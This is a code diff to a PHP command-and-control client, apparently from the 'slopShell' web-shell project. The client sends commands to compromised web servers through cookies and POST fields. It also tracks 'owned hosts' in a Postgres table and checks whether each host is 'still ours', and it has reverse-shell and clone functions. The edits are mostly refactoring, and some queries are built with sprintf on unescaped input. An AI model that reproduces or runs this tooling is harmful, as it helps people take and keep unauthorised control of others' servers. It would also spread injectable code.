@@ -64,6 +64,7 @@ function logo($last, $cl, bool $error, $error_value)
         echo("\033[33;40m  Gr33tz: Notroot, J5                                                               \033[0m\n");
         echo("\033[33;40m  Git: https://github.com/oldkingcone/slopShell                                     \033[0m\n");
         print("\033[33;40m  All proxybroker instances have been killed, they died in peace.. in their sleep. F in chat to pay respects.\n");
+        curl_close(CHH);
     } else if (is_null($last)) {
         system($cl);
         echo("\033[33;40m                                                                                    \033[0m\n");
@@ -146,14 +147,15 @@ function opts()
 
 function sys($host, $uri)
 {
+    $curlHandle = CHH;
     if (!empty($host) && !empty($userA)) {
-        curl_setopt(CHH, CURLOPT_URL, "$host/$uri?qs=cqBS");
-        curl_setopt(CHH, CURLOPT_TIMEOUT, 15);
-        curl_setopt(CHH, CURLOPT_CONNECTTIMEOUT, 15);
-        curl_setopt(CHH, CURLOPT_RETURNTRANSFER, true);
-        $syst = curl_exec(CHH);
-        if (!curl_errno(CHH)) {
-            switch ($http_code = curl_getinfo(CHH, CURLINFO_HTTP_CODE)) {
+        curl_setopt($curlHandle, CURLOPT_URL, "$host/$uri?qs=cqBS");
+        curl_setopt($curlHandle, CURLOPT_TIMEOUT, 15);
+        curl_setopt($curlHandle, CURLOPT_CONNECTTIMEOUT, 15);
+        curl_setopt($curlHandle, CURLOPT_RETURNTRANSFER, true);
+        $syst = curl_exec($curlHandle);
+        if (!curl_errno($curlHandle)) {
+            switch (curl_getinfo($curlHandle, CURLINFO_HTTP_CODE)) {
                 case 200:
                     return $syst;
                 default:
@@ -196,10 +198,11 @@ function rev($host, $shell, $port, $os)
 
 function co($command, $host, $uri, bool $encrypt)
 {
+    $curlHandle = CHH;
     if ($encrypt === true && !is_null($command)) {
-        $our_nonce = random_bytes(SODIUM_CRYPTO_AEAD_XCHACHA20POLY1305_IETF_NPUBBYTES);
-        $secure_Key = random_bytes(SODIUM_CRYPTO_AEAD_XCHACHA20POLY1305_IETF_KEYBYTES);
-        $additionalData = random_bytes(SODIUM_CRYPTO_AEAD_XCHACHA20POLY1305_IETF_ABYTES);
+        $our_nonce = openssl_random_pseudo_bytes(SODIUM_CRYPTO_AEAD_XCHACHA20POLY1305_IETF_NPUBBYTES);
+        $secure_Key = openssl_random_pseudo_bytes(SODIUM_CRYPTO_AEAD_XCHACHA20POLY1305_IETF_KEYBYTES);
+        $additionalData = openssl_random_pseudo_bytes(SODIUM_CRYPTO_AEAD_XCHACHA20POLY1305_IETF_ABYTES);
         try {
             $un = base64_encode(serialize(array("plain" => $command)));
             $ct = sodium_crypto_aead_xchacha20poly1305_ietf_encrypt($un, $additionalData, $our_nonce, $secure_Key);
@@ -216,18 +219,18 @@ function co($command, $host, $uri, bool $encrypt)
         $space_Safe_coms = base64_encode(serialize(array("cr" => base64_encode($command))));
     }
     if (!empty($host) && !is_null($space_Safe_coms) && !is_null($cr) && !empty($uri)) {
-        curl_setopt(CHH, CURLOPT_URL, "$host/$uri");
-        curl_setopt(CHH, CURLOPT_TIMEOUT, 15);
-        curl_setopt(CHH, CURLOPT_CONNECTTIMEOUT, 15);
-        curl_setopt(CHH, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt(CHH, CURLOPT_POST, true);
+        curl_setopt($curlHandle, CURLOPT_URL, "$host/$uri");
+        curl_setopt($curlHandle, CURLOPT_TIMEOUT, 15);
+        curl_setopt($curlHandle, CURLOPT_CONNECTTIMEOUT, 15);
+        curl_setopt($curlHandle, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($curlHandle, CURLOPT_POST, true);
         //this is the default value the shell will be looking for, change it make it unique.
         // and for those of you who read the source before you run. Howd ya get so smort.
-        curl_setopt(CHH, CURLOPT_COOKIE, "cx={$space_Safe_coms}");
-        curl_setopt(CHH, CURLOPT_POSTFIELDS, "cr={$cr}");
-        $syst = curl_exec(CHH);
-        if (!curl_errno(CHH)) {
-            switch ($http_code = curl_getinfo(CHH, CURLINFO_HTTP_CODE)) {
+        curl_setopt($curlHandle, CURLOPT_COOKIE, "cx={$space_Safe_coms}");
+        curl_setopt($curlHandle, CURLOPT_POSTFIELDS, "cr={$cr}");
+        $syst = curl_exec($curlHandle);
+        if (!curl_errno($curlHandle)) {
+            switch ($http_code = curl_getinfo($curlHandle, CURLINFO_HTTP_CODE)) {
                 case 200:
                     return $syst;
                 default:
@@ -273,6 +276,7 @@ function clo($host, $repo, $uri)
             );
             logo('cloner', clears, true, $errors);
         }
+        curl_close(CHH);
     } else {
         $errors = array(
             "Host" => $host,
@@ -364,23 +368,22 @@ function aHo($host, $os, $checkIn)
 
 function check($host, $path, $batch)
 {
-    $dbC = pg_connect(DBCONN);
+    $curlHandle = CHH;
     if (!empty($batch)) {
         switch ($batch) {
             case "y":
-//                $qc = queryDB($host, $batch);
-                $c = pg_exec($dbC, "SELECT rhost,uri FROM sloppy_bots_main WHERE NOT NULL OR NOT '-'");
-                $count = pg_exec($dbC, 'SELECT COUNT(*) FROM (SELECT rhost from sloppy_bots_main WHERE rhost IS NOT NULL) AS TEMP');
+                $c = pg_exec(pg_connect(DBCONN), "SELECT rhost,uri FROM sloppy_bots_main WHERE NOT NULL OR NOT '-'");
+                $count = pg_exec(pg_connect(DBCONN), 'SELECT COUNT(*) FROM (SELECT rhost from sloppy_bots_main WHERE rhost IS NOT NULL) AS TEMP');
                 echo "Pulling: " . pg_fetch_row($count) . "\nThis could take awhile.";
                 curl_setopt(CHH, CURLOPT_TIMEOUT, 5);
                 curl_setopt(CHH, CURLOPT_CONNECTTIMEOUT, 5);
                 curl_setopt(CHH, CURLOPT_RETURNTRANSFER, true);
-                foreach (pg_fetch_all($c) as $r) {
+                foreach (pg_fetch_all($c) as $r => $bH) {
                     if (!empty($r)) {
-                        curl_setopt(CHH, CURLOPT_URL, "$r[0]/$r[1]?qs=cqS");
-                        $syst = curl_exec(CHH);
-                        if (!curl_errno(curl_getinfo(CHH, CURLINFO_HTTP_CODE))) {
-                            switch ($syst) {
+                        curl_setopt(CHH, CURLOPT_URL, $bH[0]."/".$bH[1]."?qs=cqS");
+                        curl_exec(CHH);
+                        if (!curl_errno(CHH)) {
+                            switch (curl_getinfo(CHH, CURLINFO_HTTP_CODE)) {
                                 case 200:
                                     echo "Host is still ours!\n";
                                     break;
@@ -401,13 +404,16 @@ function check($host, $path, $batch)
                 break;
             case "n":
                 if (!empty($host) && !empty($path)) {
-                    curl_setopt(CHH, CURLOPT_URL, "$c[0]/$c[1]?qs=cqS");
+
+                    $tc = pg_exec(pg_connect(DBCONN), sprintf("SELECT rhost,uri FROM sloppy_bots_main WHERE id = '%s'", $host));
+                    $axX = pg_fetch_row($tc);
+                    curl_setopt(CHH, CURLOPT_URL, $axX[0].$axX[1] ."?qs=cqS");
                     curl_setopt(CHH, CURLOPT_TIMEOUT, 5);
                     curl_setopt(CHH, CURLOPT_CONNECTTIMEOUT, 5);
                     curl_setopt(CHH, CURLOPT_RETURNTRANSFER, true);
-                    $syst = curl_exec(CHH);
-                    if (!curl_errno(curl_getinfo(CHH, CURLINFO_HTTP_CODE))) {
-                        switch ($syst) {
+                    curl_exec(CHH);
+                    if (!curl_errno(CHH)) {
+                        switch (curl_getinfo(CHH, CURLINFO_HTTP_CODE)) {
                             case 200:
                                 echo "Host is still ours!\n";
                                 break;
@@ -435,21 +441,25 @@ function queryDB($host, $fetchWhat)
     # so Example would be a windows based host, it will preset windows options for you when you execute rev, or you can set your own.
     # work in progress.
     # @todo
-    if (!empty($host) || $host != 0) {
+    if (!empty($host)) {
         try {
-            $dbC = pg_connect(DBCONN);
+            $dbCC = pg_connect(DBCONN);
             switch (strtolower($fetchWhat)) {
                 case "ch":
-                    $row = pg_fetch_all($dbC, "SELECT * FROM sloppy_bots_main");
+                    $row = pg_fetch_all($dbCC, "SELECT * FROM sloppy_bots_main");
+                    pg_close();
                     break;
                 case "chR":
-                    $row = pg_fetch_row($dbC, sprintf("SELECT rhost,uri FROM sloppy_bots_main WHERE id = '%s'", $host));
+                    $row = pg_query($dbCC, sprintf("SELECT rhost,uri FROM sloppy_bots_main WHERE id = '%s'", $host));
+                    pg_close();
                     break;
                 case "r":
-                    $row = pg_fetch_row($dbC, sprintf("SELECT os_flavor FROM sloppy_bots_main WHERE rhost = '%s'", pg_escape_string($host)));
+                    $row = pg_query($dbCC, sprintf("SELECT os_flavor FROM sloppy_bots_main WHERE rhost = '%s'", pg_escape_string($host)));
+                    pg_close();
                     break;
                 default:
-                    $row = pg_fetch_row($dbC, sprintf("SELECT rhost, uri FROM sloppy_bots_main WHERE rhost = '%s'", pg_escape_string($host)));
+                    $row = pg_query($dbCC, sprintf("SELECT rhost, uri FROM sloppy_bots_main WHERE rhost = '%s'", pg_escape_string($host)));
+                    pg_close();
                     break;
             }
             if (!empty($row)) {
@@ -581,10 +591,10 @@ while ($run) {
             try {
                 $axx = pg_exec(pg_connect(DBCONN), "SELECT * FROM sloppy_bots_main LIMIT 20");
                 $count = pg_exec(pg_connect(DBCONN), 'SELECT COUNT(*) FROM (SELECT rhost from sloppy_bots_main WHERE rhost IS NOT NULL) AS TEMP');
-                echo str_repeat("+", 35) . "[ OWNED HOSTS ]" .str_repeat("+", 39)."\n";
+                echo str_repeat("+", 35) . "[ OWNED HOSTS ]" .str_repeat("+", 39)."\n\n";
                 $a = 0;
                 foreach (pg_fetch_all($axx) as $tem => $use){
-                    print(sprintf("[ ID: ]-> %s [ RHOST: ] -> %s [ URI: ]-> %s [ OS_FLAVOR: ]-> %s [ CHECKED_IN: ]-> %s\n",
+                    print(sprintf("[ ID: ]-> %s [ RHOST: ]-> %s [ URI: ]-> %s [ OS_FLAVOR: ]-> %s [ CHECKED_IN: ]-> %s\n",
                         $use['id'],
                         $use['rhost'],
                         $use['uri'],
@@ -593,17 +603,21 @@ while ($run) {
 
                     ));
                 }
-                echo str_repeat("+", 35) . "[ END OWNED HOSTS ]" .str_repeat("+", 35)."\n";
+                echo "\n\n".str_repeat("+", 35) . "[ END OWNED HOSTS ]" .str_repeat("+", 35)."\n\n";
                 $b = readline("Is this going to be a batch job?(Y/N)\n->");
                 switch (!empty(strtolower($b))) {
                     case "n":
                         echo "Not executing batch job.\n";
                         $h = readline("Who is it we need to check on?(based on ID)\n->");
-                        check($h, queryDB($h, "chR"), "n");
+                        check($h, "chR", "n");
+                        pg_free_result($count);
+                        pg_free_result($axx);
                         break;
                     case "y":
                         echo "Executing batch job!\n";
                         check('0', 'b', "y");
+                        pg_free_result($count);
+                        pg_free_result($axx);
                         break;
                     default:
                         logo('ch', clears, true, "Your host was empty, sorry but I will return you to the previous menu.\n");
